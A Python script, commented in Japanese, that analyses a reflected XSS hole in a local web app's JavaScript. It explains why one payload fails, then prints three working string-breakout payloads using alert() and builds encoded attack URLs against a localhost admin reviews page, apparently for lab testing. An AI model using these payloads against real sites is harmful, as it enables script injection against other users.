#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
JavaScript Reflection XSS - 実際に動作するペイロード分析
"""

import urllib.parse

def analyze_payload():
    print("🔍 JavaScript反射XSS - 実際の構造分析")
    print("=" * 60)
    
    # 現在の JavaScript 構造
    print("\n📋 現在のJavaScript構造:")
    print("""
// 反射点1: console.log
console.log('{{ comment }}');

// 反射点2: 変数定義  
var msg = '{{ comment }}';

// 反射点3: 関数呼び出し
showNotification('コメント：' + '{{ comment }}' + ' を書き込みました。');
""")
    
    print("\n❌ 失敗したペイロード分析:")
    failed_payload = "');alert(1);var msg ='1';//"
    print(f"ペイロード: {failed_payload}")
    print("\n生成されるJavaScript:")
    print(f"console.log('{failed_payload}');")
    print(f"var msg = '{failed_payload}';  // ← var msg が重複してエラー")
    print(f"showNotification('コメント：' + '{failed_payload}' + ' を書き込みました。');")
    
    print("\n✅ 動作するペイロード 1 - シンプル版:")
    working_payload1 = "';alert(1)//"
    print(f"ペイロード: {working_payload1}")
    print(f"URLエンコード: {urllib.parse.quote(working_payload1)}")
    print("\n生成されるJavaScript:")
    print(f"console.log('{working_payload1}');  // ← alert実行、以降コメント化")
    print(f"var msg = '{working_payload1}';     // ← 有効な文字列")
    print(f"showNotification('コメント：' + '{working_payload1}' + ' を書き込みました。');")
    
    print("\n✅ 動作するペイロード 2 - 確実版:")
    working_payload2 = "';alert('XSS');void('"
    print(f"ペイロード: {working_payload2}")
    print(f"URLエンコード: {urllib.parse.quote(working_payload2)}")
    print("\n生成されるJavaScript:")
    print(f"console.log('{working_payload2}');")
    print(f"var msg = '{working_payload2}';")
    print(f"showNotification('コメント：' + '{working_payload2}' + ' を書き込みました。');")
    
    print("\n✅ 動作するペイロード 3 - 複数実行版:")
    working_payload3 = "';alert(1);alert(2);void('"
    print(f"ペイロード: {working_payload3}")
    print(f"URLエンコード: {urllib.parse.quote(working_payload3)}")
    
    print("\n🎯 推奨ペイロード:")
    print("1. 基本: ';alert(1)//")
    print("2. 確実: ';alert('XSS');void('") 
    print("3. 複数: ';alert(1);alert(2);void('")
    
    print("\n📝 攻撃URL例:")
    base_url = "http://localhost:5000/admin/reviews"
    for i, payload in enumerate([working_payload1, working_payload2, working_payload3], 1):
        encoded = urllib.parse.quote(payload)
        print(f"{i}. {base_url}?updated_comment={encoded}")

if __name__ == "__main__":
    analyze_payload()